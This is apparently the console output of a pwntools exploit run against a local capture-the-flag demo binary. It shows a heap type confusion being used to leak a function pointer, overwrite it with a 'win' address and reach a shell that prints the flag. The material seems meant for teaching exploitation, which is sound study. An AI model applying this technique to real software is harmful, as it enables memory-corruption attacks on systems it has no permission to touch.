```
python3 pwn-type.py BIN=./chall_patched
[*] '/demos/type-confusion-demo/chall_patched'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
[+] Starting local process '/demos/type-confusion-demo/chall_patched': pid 2308
[*] Creating string of 20 bytes with b'11111111111111111111'
[*] Creating string of 20 bytes with b'22222222222222222222'
[*] Creating string of 20 bytes with b'33333333333333333333'
[*] Creating string of 20 bytes with b'44444444444444444444'
[*] 
    using viz_heap, we see the layout of the 
    heap, including the char* and ptrs* to display_function
[*] Paused (press any to continue)
[*] Editing index 0 to be character b'p'
[*] 
    using viz_heap, we see that the p has overwritten the
    char * with a ptr to the display_data function, this 
    allows us to leak the display_ptr address and calculate
    the base of the funciton
[*] Paused (press any to continue)
[*] Editing Char
[*] Editing index 0, to be string of 0 bytes with b''
[*] Calling display()
[*] Editing index 1 to be character b'p'
[*] Editing index 1, to be string of 8 bytes with b'\x80V$\xe6\xacU\x00\x00'
[*] 
    using viz_heap, we see that the win has overwritten the
    char * with a ptr to the display_data function, this 
    allows us to leak the display_ptr address and calculate
    the base of the funciton
[*] Paused (press any to continue)
[*] Calling display()
[*] Switching to interactive mode
$ cat flag.txt
flag{i_sure_wished_this_worked_remotely_too}
```